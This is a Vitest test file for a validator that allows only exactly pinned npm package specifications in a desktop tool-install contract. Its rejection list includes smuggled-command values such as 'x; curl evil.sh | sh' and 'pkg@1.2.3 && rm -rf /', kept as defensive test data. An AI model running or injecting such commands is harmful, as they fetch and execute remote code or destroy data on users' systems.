import { describe, expect, it } from 'vitest'
import { desktopToolInstallInputSchema, desktopToolInstallOperationId } from '@rerun/contracts'

const identity = {
    agentId: 'agent', sessionId: 'session', runId: 'run', toolCallId: 'tool', proposalRevision: '1',
    guest: { engineAgentId: 'engine', launchNonce: 'launch', sessionGeneration: 'a'.repeat(32), workspaceFingerprint: 'b'.repeat(64) },
}

describe('desktop tool install contract', () => {
    it.each(['left-pad@1.2.3', '@scope/pkg@0.0.1', '@scope/pkg@1.2.3-beta.1+build.4'])('accepts exact target %s', packageTarget => {
        expect(desktopToolInstallInputSchema.parse({ packages: [packageTarget] }).packages).toEqual([packageTarget])
    })

    it.each([
        '--prefix=/etc', 'latest', 'left-pad', 'left-pad@latest', 'left-pad@^1.2.3', 'left-pad@~1.2.3', 'left-pad@>=1.2.3',
        'https://example.com/pkg.tgz', 'file:../pkg', 'git+ssh://example.com/pkg', '../pkg@1.2.3', '/tmp/pkg@1.2.3',
        'x; curl evil.sh | sh', '@scope/pkg', 'Left-Pad@1.2.3', 'pkg@1.2', 'pkg@1.2.3 && rm -rf /',
    ])('rejects hostile or ambiguous specification %s', value => {
        expect(() => desktopToolInstallInputSchema.parse({ packages: [value] })).toThrow()
    })

    it('rejects duplicate package targets', () => {
        expect(() => desktopToolInstallInputSchema.parse({ packages: ['left-pad@1.2.3', 'left-pad@1.2.3'] })).toThrow()
    })

    it('changes operation identity when the reviewed package or guest changes', async () => {
        const first = await desktopToolInstallOperationId(identity, ['left-pad@1.2.3'])
        const otherPackage = await desktopToolInstallOperationId(identity, ['left-pad@1.2.4'])
        const otherGuest = await desktopToolInstallOperationId({ ...identity, guest: { ...identity.guest, sessionGeneration: 'b'.repeat(32) } }, ['left-pad@1.2.3'])
        expect(new Set([first, otherPackage, otherGuest]).size).toBe(3)
        expect(first).toMatch(/^[a-f0-9]{64}$/)
    })
})
